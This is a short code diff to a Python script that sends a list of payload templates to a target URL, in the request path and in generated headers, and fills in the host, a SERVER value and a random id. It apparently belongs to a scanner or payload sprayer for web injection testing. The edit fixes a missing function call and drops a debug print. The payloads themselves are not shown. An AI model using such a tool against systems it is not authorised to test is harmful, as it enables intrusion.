@@ -39,11 +39,10 @@ def start(url):
     host = url.split("/")[2]
     if host.count(":"):
         host = url.split("/")[2].split(":")[0]
-    print(host)
     for p in range(len(payloads)):
         headers = generate_header(payloads[p],p,SERVER,rand(),host)
 
-        requests.get(url+"/"+payloads[p] % (p,"path",host,SERVER,rand),verify=False,headers=headers,timeout=10)
+        requests.get(url+"/"+payloads[p] % (p,"path",host,SERVER,rand()),verify=False,headers=headers,timeout=10)
     print("[•] Payloads sent to %s" % url)
 
 def main():
